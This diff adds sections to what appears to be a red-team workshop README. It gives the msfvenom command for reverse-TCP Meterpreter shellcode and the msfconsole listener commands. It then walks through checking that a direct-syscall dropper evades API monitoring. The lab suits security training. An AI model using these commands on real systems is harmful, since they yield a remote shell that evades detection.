@@ -155,3 +155,124 @@ Furthermore we need to set the Item Type of the syscalls.asm file to Microsoft M
 <img width="1237" alt="image" src="https://user-images.githubusercontent.com/50073731/235458968-e330799e-51ff-46bf-97ab-c7d3be7ea079.png">
 <img width="778" alt="image" src="https://user-images.githubusercontent.com/50073731/235459219-4387dc48-56f8-481c-b978-1b786843a836.png">
 </details>     
+
+    
+
+## Meterpreter Shellcode
+Again, we will create our meterpreter shellcode with msfvenom in Kali Linux. To do this, we will use the following command and create x64 staged meterpreter shellcode.
+<details>
+    
+ **kali>**   
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Kali LPORT=80 -f c > /tmp/shellcode.txt
+```
+<p align="center">
+<img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
+</p>
+
+The shellcode can then be copied into the Low-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
+<img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
+</p>
+</details>    
+
+
+## MSF-Listener
+Before we test the functionality of our Low-Level-Dropper, we need to create a listener within msfconsole.
+<details>
+    
+**kali>**
+```
+msfconsole
+```
+**msf>**
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost IPv4_Redirector_or_IPv4_Kali
+set lport 80 
+set exitonsession false
+run
+```
+<p align="center">
+<img width="510" alt="image" src="https://user-images.githubusercontent.com/50073731/235358630-09f70617-5f6e-4f17-b366-131f8efe19d7.png">
+</p>
+</details>
+ 
+    
+Once the listener has been successfully started, you can run your compiled Low-Level-Dropper.exe. If all goes well, you should see an incoming command and control session. 
+<details>
+    
+<p align="center">
+<img width="674" alt="image" src="https://user-images.githubusercontent.com/50073731/235369228-84576762-b3b0-4cf7-a265-538995d42c40.png">
+</p>
+</details>
+        
+
+    
+## Low-Level-Dropper analysis: dumpbin 
+The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
+<details>    
+    
+**cmd>**
+```
+cd C:\Program Files (x86)\Microsoft Visual Studio\2019\Community
+dumpbin /imports low_level.exe
+```
+</details>    
+
+<details>
+    <summary>Solution</summary>  
+    
+**No imports** from the Windows APIs VirtualAlloc, WriteProcessMemory, CreateThread, and WaitForSingleObject from kernel32.dll. This was expected and is correct.
+<p align="center">
+<img width="1023" alt="image" src="https://user-images.githubusercontent.com/50073731/235473764-c85ccc73-a1cb-403d-8162-172146375d96.png">
+</p>
+</details>   
+    
+    
+## Low-Level-Dropper analysis: API-Monitor
+For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in the context of the used APIs in our Medium-Level-Dropper. We filter on the following API calls:
+- VirtualAlloc
+- NtAllocateVirtualMemory
+- WriteProcessMemory
+- NtWriteVirtualMemory
+- CreateThread
+- NtCreateThreadEx
+- WaitForSingleObject
+- NtWaitForSingleObject
+
+<details>
+    <summary>Solution</summary>    
+If everything was done correctly, you could see that the four used Windows APIs and their native APIs are no longer imported from kernel32.dll and ntdll.dll to the Low-Level-Dropper.exe.
+This result was expected and is correct because our Low-Level-Dropper has directly implemented the necessary syscalls or syscall stubs for the respective native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject.
+<p align="center">
+<img width="595" alt="image" src="https://user-images.githubusercontent.com/50073731/235480936-df805736-aad8-44a7-8bec-f8563735d1d2.png">
+</p>
+</details>    
+
+## Low-Level-Dropper analysis: x64dbg 
+Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
+Remember, now we have not implemented system calls or system call stubs directly in the dropper. What results would you expect?
+<details>
+    <summary>Solution</summary>
+    
+1. Open or load your Low-Level-Dropper.exe into x64dbg
+2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight your **Low-Level-Dropper.exe**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. Compared to the High-Level-Dropper and the Medium-Level-Dropper we can see that the symbols for the used native APIs are implemented directly in the dropper itself and not imported from the ntdll.dll.
+    
+<p align="center">    
+<img width="979" alt="image" src="https://user-images.githubusercontent.com/50073731/235481553-012459f5-1284-44ed-b3ed-2b04bfcccd3b.png">
+</p>
+    
+As expected, we can observe that the corresponding system calls for the native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject are no longer 
+imported from the .text section in the ntdll.dll module. Instead the syscalls or syscalls stubs are directly implemtented into the .text section of the Low-Level-Dropper itself.
+    
+<p align="center">    
+<img width="990" alt="image" src="https://user-images.githubusercontent.com/50073731/235482389-35cd8c12-593e-4089-b082-8eaf2ba6636a.png"></p>    
+</details>
+
+
+## Summary:
+- Made transition from medium to low level or from Native APIs to direct syscalls
+- Dropper imports no longer Windows APIs from kernel32.dll
+- Dropper imports no longer Native APIs from ntdll.dll
+- Syscalls or syscall stubs are "implemented" directly into .text section of .exe
